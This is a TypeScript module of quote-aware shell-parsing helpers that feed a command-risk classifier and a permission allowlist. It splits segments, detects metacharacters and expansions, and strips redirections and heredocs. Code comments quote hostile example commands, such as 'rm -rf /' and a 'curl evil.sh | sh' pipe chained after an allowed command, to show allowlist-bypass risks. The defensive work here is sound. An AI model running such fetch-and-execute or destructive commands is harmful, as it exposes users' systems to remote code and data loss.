// Quote-aware shell-syntax primitives (flow 115).
//
// Shared by the command-risk classifier and the permission allowlist. Both need
// to answer "what is actually a command here, and what is merely text inside an
// argument" — `echo 'rm -rf /'` must not read as a destructive command, and
// `git commit -m "fix: a; b"` must not read as two commands.
//
// This is deliberately NOT a shell parser. It tracks single quotes, double
// quotes, and backslash escaping — enough to tell a structural metacharacter
// from a quoted one — and it fails CLOSED on input it cannot analyse
// (unbalanced quotes). Anything beyond that is left to the human gate.
//
// Pure and deterministic: no clock, RNG, filesystem, env, or network.

/** Separators that end one simple command inside a compound command line. */
export type Separator = "|" | ";" | "&&" | "||" | "\n";

/** One simple command inside a compound command line. */
export interface Segment {
  /** Raw text of this simple command (separators excluded). */
  raw: string;
  /** Quote-aware words, with surrounding quotes stripped. */
  words: string[];
  /** The separator that INTRODUCED this segment (undefined for the first). */
  precededBy?: Separator;
}

/**
 * Structural metacharacters: they chain, redirect, background, or substitute —
 * i.e. they let one approved-looking string run something else.
 *
 * `$VAR` is deliberately NOT here: bare variable expansion is too common
 * (`echo $PATH`) and cannot by itself introduce a new command. `$(` and a
 * backtick can, and are.
 */
const METACHARACTERS = new Set([";", "&", "|", "<", ">", "\n", "`"]);

interface ScanState {
  /** True when the scan ended inside an unterminated quote. */
  unbalanced: boolean;
  /** True when any structural metacharacter appeared outside quotes. */
  metacharacter: boolean;
}

/** One step inside an open quote: the new quote state, and whether to skip a char. */
function stepInsideQuote(
  ch: string,
  next: string | undefined,
  quote: '"' | "'",
): { quote: '"' | "'" | undefined; skipNext: boolean } {
  // Only double quotes honour backslash escaping; inside '' everything is literal.
  if (quote === '"' && ch === "\\" && next !== undefined) {
    return { quote, skipNext: true };
  }
  return { quote: ch === quote ? undefined : quote, skipNext: false };
}

/** True when `ch` (with lookahead) is a structural metacharacter outside quotes. */
function isStructural(ch: string, next: string | undefined): boolean {
  if (ch === "$") return next === "(";
  return METACHARACTERS.has(ch);
}

/** True when `ch` (with lookahead) starts a command substitution: `$(` or a backtick. */
function isSubstitution(ch: string, next: string | undefined): boolean {
  return ch === "`" || (ch === "$" && next === "(");
}

/** Walk `text` tracking quote state; report structural metacharacters (outside quotes, or a substitution inside ""). */
function scan(text: string): ScanState {
  let quote: '"' | "'" | undefined;
  let metacharacter = false;

  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    const next = text[i + 1];

    if (quote !== undefined) {
      // Double quotes keep `$(` and a backtick live: sh still runs the
      // substitution there (`ls "$(curl … | sh)"`). Only '' is fully literal.
      if (quote === '"' && isSubstitution(ch, next)) metacharacter = true;
      const step = stepInsideQuote(ch, next, quote);
      quote = step.quote;
      if (step.skipNext) i++;
      continue;
    }
    if (ch === "\\" && next !== undefined) {
      i++; // an escaped character is literal, never structural
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      continue;
    }
    if (isStructural(ch, next)) {
      metacharacter = true;
    }
  }

  return { unbalanced: quote !== undefined, metacharacter };
}

/**
 * True when `command` contains a shell metacharacter OUTSIDE quotes, a command
 * substitution (`$(` or a backtick) inside double quotes, or cannot be analysed
 * at all (unbalanced quotes → fail closed).
 *
 * A command for which this is true must never be matched against a saved
 * allowlist pattern and must never be remembered as one: the pattern would be
 * matched against raw text that `/bin/sh -c` then re-interprets, so `git *`
 * would cover `git status; curl evil.sh | sh`.
 */
export function hasUnquotedMetacharacter(command: string): boolean {
  const state = scan(command);
  return state.unbalanced || state.metacharacter;
}

/**
 * True when `command` has a backslash, `$`, `{`, `}`, a glob character (`*`, `?`, `[`) or a word-initial `~` OUTSIDE
 * quotes, a `$` or backtick inside double quotes, or cannot be analysed (unbalanced quotes). The shell rewrites such a word (`$IFS`, a brace list, `$'..'`, an
 * escape, a glob that matches a file named like an option, a home directory) into words this module does not compute,
 * so a caller that judges the words by their text must not approve the command.
 */
export function hasUnquotedExpansion(command: string): boolean {
  let quote: '"' | "'" | undefined;
  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!;
    if (quote !== undefined) {
      // Inside "" the shell still expands `$…` and backticks, so the word's text is not what runs.
      if (quote === '"' && (ch === "$" || ch === "`")) return true;
      const step = stepInsideQuote(ch, command[i + 1], quote);
      quote = step.quote;
      if (step.skipNext) i++;
      continue;
    }
    if (ch === "'" || ch === '"') quote = ch;
    else if (ch === "\\" || ch === "$" || ch === "{" || ch === "}") return true;
    else if (ch === "*" || ch === "?" || ch === "[") return true;
    else if (ch === "~" && (i === 0 || /\s/.test(command[i - 1]!))) return true;
  }
  return quote !== undefined;
}

/**
 * Split a command line into simple-command segments, honouring quotes and
 * backslash escapes so a separator inside a quoted argument never splits.
 */
export function splitSegments(command: string): Segment[] {
  const segments: Segment[] = [];
  let buf = "";
  let pending: Separator | undefined;
  let quote: '"' | "'" | undefined;

  const flush = (next?: Separator): void => {
    const raw = buf.trim();
    if (raw.length > 0) {
      segments.push({
        raw,
        words: splitWords(raw),
        ...(pending !== undefined ? { precededBy: pending } : {}),
      });
    }
    buf = "";
    pending = next;
  };

  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!;
    const next = command[i + 1];

    if (quote !== undefined) {
      buf += ch;
      if (quote === '"' && ch === "\\" && next !== undefined) {
        buf += next;
        i++;
        continue;
      }
      if (ch === quote) quote = undefined;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      buf += ch;
      continue;
    }
    if (ch === "\\" && next !== undefined) {
      buf += ch + next;
      i++;
      continue;
    }
    const sep = separatorAt(ch, next);
    if (sep !== undefined) {
      flush(sep.separator);
      i += sep.length - 1;
      continue;
    }
    buf += ch;
  }
  flush();
  return segments;
}

/** The separator starting at this character, if any, and how many chars it spans. */
function separatorAt(
  ch: string,
  next: string | undefined,
): { separator: Separator; length: number } | undefined {
  if (ch === "&" && next === "&") return { separator: "&&", length: 2 };
  if (ch === "|" && next === "|") return { separator: "||", length: 2 };
  if (ch === "|") return { separator: "|", length: 1 };
  if (ch === ";") return { separator: ";", length: 1 };
  if (ch === "\n") return { separator: "\n", length: 1 };
  return undefined;
}

/** Quote-aware word split; surrounding quotes are stripped from each word. */
export function splitWords(text: string): string[] {
  const words: string[] = [];
  let buf = "";
  let quote: '"' | "'" | undefined;
  let started = false;

  const push = (): void => {
    if (started || buf.length > 0) words.push(buf);
    buf = "";
    started = false;
  };

  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    if (quote !== undefined) {
      const next = text[i + 1];
      if (quote === '"' && ch === "\\" && next !== undefined) {
        buf += ch + next;
        i++;
        continue;
      }
      if (ch === quote) quote = undefined;
      else buf += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      started = true;
      continue;
    }
    if (/\s/.test(ch)) {
      if (buf.length > 0 || started) push();
      continue;
    }
    buf += ch;
  }
  push();
  return words;
}

/** Drop leading `VAR=value` assignments so they cannot hide the command word. */
export function stripAssignments(words: readonly string[]): string[] {
  let i = 0;
  while (i < words.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[i]!)) i++;
  return words.slice(i);
}

/**
 * Lowercased basename of the command word: `/usr/bin/rm` → `rm`. A backslash escape the shell
 * drops (`\rm`, `r\m`) and a leading subshell/group opener (`(rm`) are removed first, so those
 * spellings name the command they run. Wrapper words (`env rm`, `nice rm`) are NOT peeled here.
 */
export function commandWord(words: readonly string[]): string {
  const first = (stripAssignments(words)[0] ?? "").replace(/^[({]+/, "").replace(/\\(.)/g, "$1");
  const base = first.split("/").pop() ?? first;
  return base.toLowerCase();
}

/** Syntax a shell reads in front of a command: a reserved word, or a redirection with its target. */
const LEADING_SYNTAX = /^(?:(?:if|then|elif|else|while|until|do|coproc|!)\s+|\d*(?:>>?|<)&?\s*\S+\s+)+/;
/** How many levels of `(…)` and `$(…)` {@link structuralCommands} opens; past this the caller's other readings stand alone. */
const MAX_STRUCTURAL_NESTING = 16;

/** Index of the backtick closing a substitution whose body starts at `from`, or `text.length` when it never closes. */
function closingBacktick(text: string, from: number): number {
  for (let i = from; i < text.length; i++) {
    if (text[i] === "\\") i++;
    else if (text[i] === "`") return i;
  }
  return text.length;
}

/** Index of the `)` closing a group whose body starts at `from`, or `text.length` when it never closes. Quote-aware, per open paren. */
function closingParen(text: string, from: number): number {
  const quotes: Array<'"' | "'" | undefined> = [undefined];
  for (let i = from; i < text.length; i++) {
    const ch = text[i]!;
    const quote = quotes[quotes.length - 1];
    if (quote === "'") {
      if (ch === "'") quotes[quotes.length - 1] = undefined;
    } else if (ch === "\\") {
      i++;
    } else if (ch === "`") {
      i = closingBacktick(text, i + 1);
    } else if (quote === '"') {
      if (ch === '"') quotes[quotes.length - 1] = undefined;
      else if (ch === "$" && text[i + 1] === "(") {
        quotes.push(undefined);
        i++;
      }
    } else if (ch === '"' || ch === "'") {
      quotes[quotes.length - 1] = ch;
    } else if (ch === "(") {
      quotes.push(undefined);
    } else if (ch === ")") {
      quotes.pop();
      if (quotes.length === 0) return i;
    }
  }
  return text.length;
}

/**
 * Every simple command in `command`, cut at what {@link splitSegments} leaves inside a segment: a single `&`, a subshell
 * or a standalone `{ }` group, a case arm, `$(…)`, `<(…)` and backticks (also inside double quotes), and with leading
 * shell syntax (`then`, `do`, `!`, `2>/dev/null`) dropped. A substitution stays in its outer command as the opaque word
 * `$_`, so `echo $(date) hc keys` still reads as `echo`.
 *
 * Still not a shell parser. An unbalanced group runs to the end of the text; input in a heredoc reads as commands, as
 * it does in `splitSegments`. Callers use this next to the plain segments, never instead of them.
 */
export function structuralCommands(command: string, nesting = 0): string[] {
  if (nesting >= MAX_STRUCTURAL_NESTING) return [];
  const out: string[] = [];
  let buf = "";
  let quote: '"' | "'" | undefined;
  const flush = (): void => {
    const raw = buf.trim().replace(LEADING_SYNTAX, "");
    if (raw.length > 0) out.push(raw);
    buf = "";
  };
  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!;
    const next = command[i + 1];
    if (quote === "'") {
      buf += ch;
      if (ch === "'") quote = undefined;
      continue;
    }
    if (ch === "\\" && next !== undefined) {
      buf += ch + next;
      i++;
      continue;
    }
    const opensSubstitution = (ch === "$" && next === "(") || (quote === undefined && (ch === "<" || ch === ">") && next === "(");
    if (ch === "`" || opensSubstitution) {
      const open = ch === "`" ? i + 1 : i + 2;
      const close = ch === "`" ? closingBacktick(command, open) : closingParen(command, open);
      out.push(...structuralCommands(command.slice(open, close), nesting + 1));
      buf += "$_";
      i = close;
      continue;
    }
    if (quote === '"') {
      buf += ch;
      if (ch === '"') quote = undefined;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      buf += ch;
      continue;
    }
    if (ch === "(") {
      flush();
      const close = closingParen(command, i + 1);
      out.push(...structuralCommands(command.slice(i + 1, close), nesting + 1));
      i = close;
      continue;
    }
    const redirection = ch === "&" && (next === ">" || command[i - 1] === ">" || command[i - 1] === "<");
    const groupWord = (ch === "{" || ch === "}") && (i === 0 || /[\s;&|)]/.test(command[i - 1]!)) && (next === undefined || /[\s;]/.test(next));
    if (groupWord || ch === ")" || ch === ";" || ch === "|" || ch === "\n" || (ch === "&" && !redirection)) {
      flush();
      continue;
    }
    buf += ch;
  }
  flush();
  return out;
}

/** A redirection operator at the start of the text, a file descriptor number not included. `<<<` and `<(`, `>(` are not. */
const REDIRECTION_OPERATOR = /^(?:&>>?|>>|>\||>&|>(?!\()|<&|<>|<<-?(?!<)|<(?![<(]))/;

/** Index just past the word starting at `from` in `text`, quotes and substitutions included. */
function endOfWord(text: string, from: number): number {
  let quote: '"' | "'" | undefined;
  for (let i = from; i < text.length; i++) {
    const ch = text[i]!;
    if (quote === "'") {
      if (ch === "'") quote = undefined;
    } else if (ch === "\\") {
      i++;
    } else if (ch === "`") {
      i = closingBacktick(text, i + 1);
    } else if (ch === "$" && text[i + 1] === "(") {
      i = closingParen(text, i + 2);
    } else if (quote === '"') {
      if (ch === '"') quote = undefined;
    } else if (ch === '"' || ch === "'") {
      quote = ch;
    } else if (/\s/.test(ch)) {
      return i;
    }
  }
  return text.length;
}

/**
 * `raw` (one simple command) without its redirections: the operator, a file descriptor number in front of it, and the
 * target, whether attached or a separate word. A shell takes these out before it looks at the words, wherever they stand:
 * `&>x hc keys`, `X=1 >x hc keys`, `hc 2>x keys`, `hc > x keys`, `hc>x keys`. A quoted `>` is text, a here-string keeps its
 * word (`sh <<< 'cmd'` runs it), and text inside a substitution is left alone.
 */
export function withoutRedirections(raw: string): string {
  let out = "";
  let quote: '"' | "'" | undefined;
  let wordStart = true;
  for (let i = 0; i < raw.length; i++) {
    const ch = raw[i]!;
    if (quote === "'") {
      out += ch;
      if (ch === "'") quote = undefined;
      continue;
    }
    if (ch === "\\" && raw[i + 1] !== undefined) {
      out += ch + raw[i + 1]!;
      i++;
      wordStart = false;
      continue;
    }
    const opensParen = ch === "$" || (quote === undefined && (ch === "<" || ch === ">"));
    if (ch === "`" || (opensParen && raw[i + 1] === "(")) {
      const close = ch === "`" ? closingBacktick(raw, i + 1) : closingParen(raw, i + 2);
      out += raw.slice(i, close + 1);
      i = close;
      wordStart = false;
      continue;
    }
    if (quote === '"') {
      out += ch;
      if (ch === '"') quote = undefined;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      out += ch;
      wordStart = false;
      continue;
    }
    if (raw.startsWith("<<<", i)) {
      out += "<<<";
      i += 2;
      wordStart = false;
      continue;
    }
    const descriptor = wordStart ? (/^\d+(?=[<>])/.exec(raw.slice(i))?.[0] ?? "") : "";
    const operator = REDIRECTION_OPERATOR.exec(raw.slice(i + descriptor.length))?.[0];
    if (operator !== undefined) {
      let target = i + descriptor.length + operator.length;
      while (target < raw.length && /\s/.test(raw[target]!)) target++;
      i = endOfWord(raw, target) - 1;
      out += " ";
      wordStart = true;
      continue;
    }
    out += ch;
    wordStart = /\s/.test(ch);
  }
  return out.trim();
}

/** The opening of a heredoc, and its delimiter in whichever quoting; `<<<` is a here-string and has no body. */
const HEREDOC_OPENING = /(?<!<)<<-?(?!<)\s*(?:'([^'\n]+)'|"([^"\n]+)"|\\?([\w.-]+))/g;

/**
 * `command` without the lines of its heredocs (to the delimiter line, or the end of the text when it never comes). The
 * opening is found on the raw text, quotes not considered, so a `<<x` in a quoted word can drop lines that are really
 * commands. Use this only where reading less is the safe direction, as for what a grant records.
 */
export function stripHeredocBodies(command: string): string {
  const kept: string[] = [];
  const pending: string[] = [];
  for (const line of command.split("\n")) {
    if (pending.length > 0) {
      if (line.trim() === pending[0]) pending.shift();
      continue;
    }
    kept.push(line);
    for (const match of line.matchAll(HEREDOC_OPENING)) pending.push(match[1] ?? match[2] ?? match[3]!);
  }
  return kept.join("\n");
}
